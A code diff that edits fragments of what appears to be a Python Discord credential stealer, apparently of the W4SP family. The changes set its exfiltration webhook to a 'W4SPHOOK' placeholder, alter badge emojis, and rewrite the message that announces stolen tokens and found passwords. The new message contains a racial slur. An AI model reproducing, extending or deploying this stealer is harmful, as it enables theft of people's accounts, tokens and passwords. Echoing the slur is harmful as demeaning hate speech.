@@ -16,7 +16,7 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-hook='https://discord.com/api/webhooks/None/None'
+hook='W4SPHOOK'
 DETECTED=False
 def getip():
     ip='None'
@@ -106,7 +106,7 @@ def Trust(Cookies):
         return DETECTED
 def GetUHQFriends(token):
     badgeList=[
-{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},
+{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:indian:1081696696460906678> '},
 {'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
 {'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
 {'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
@@ -161,7 +161,7 @@ def GetBadge(flags):
     if flags==0:return ''
     OwnedBadges=''
     badgeList=[
-{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},
+{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:indian:1081696696460906678> '},
 {'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},
 {'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},
 {'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},
@@ -230,7 +230,7 @@ def uploadToken(token,path):
         badge,phone,billing=badge,phone,None
     if nitro=='' and badge=='':nitro=' -'
     data={
-        'content':f'Found in `{path}`',
+        'content':f'Nigga's Pc Was Injected So here is the new log @everyone',
         'embeds':[
 {
             'color':16711680,
@@ -339,7 +339,7 @@ def upload(name,tk=''):
             'color':16711680,
             'fields':[
 {
-                'name':'Passwords that have been found:',
+                'name':'Passwords that has been found:',
                 'value':ra
 }
 ],
